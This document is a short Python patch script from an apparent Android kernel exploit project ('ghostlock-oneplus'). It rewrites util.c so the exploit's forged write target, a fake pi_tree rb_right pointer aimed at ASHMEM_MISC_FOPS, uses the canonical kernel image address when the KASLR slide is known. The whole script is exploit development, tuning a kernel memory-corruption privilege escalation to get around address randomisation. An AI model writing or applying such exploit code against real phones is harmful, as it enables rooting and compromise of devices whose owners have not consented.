#!/usr/bin/env python3
"""patch_slide_canon2.py

The mode-4 PI write target is `write_right` (W0->pi_tree.rb_right), built in
prepare_skb_payload() as data_addr(ASHMEM_MISC_FOPS).  With KASLR the linear
alias needs the exact loader phys base (unknown) -> miss.  Switch it to the
canonical image address when the virtual slide is known (same physical page,
.data is RW).  slide==0 keeps the old linear behaviour.
"""
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
s = open(U).read()
assert "canon_addr(ASHMEM_MISC_FOPS)" not in s, "util.c already patched"

old1 = """      fake_parent = fake_fops;
      fake_right = data_addr(ASHMEM_MISC_FOPS);
"""
new1 = """      fake_parent = fake_fops;
      fake_right = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                                      : data_addr(ASHMEM_MISC_FOPS);
"""
assert s.count(old1) == 1, ("util.c fake_right", s.count(old1))
s = s.replace(old1, new1, 1)

old2 = """    write_pc = fake_fops;
    write_right = data_addr(ASHMEM_MISC_FOPS);
"""
new2 = """    write_pc = fake_fops;
    write_right = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                                     : data_addr(ASHMEM_MISC_FOPS);
"""
assert s.count(old2) == 1, ("util.c write_right", s.count(old2))
s = s.replace(old2, new2, 1)

open(U, "w").write(s)
print("util.c: mode-4 write_right via canon_addr when slid")
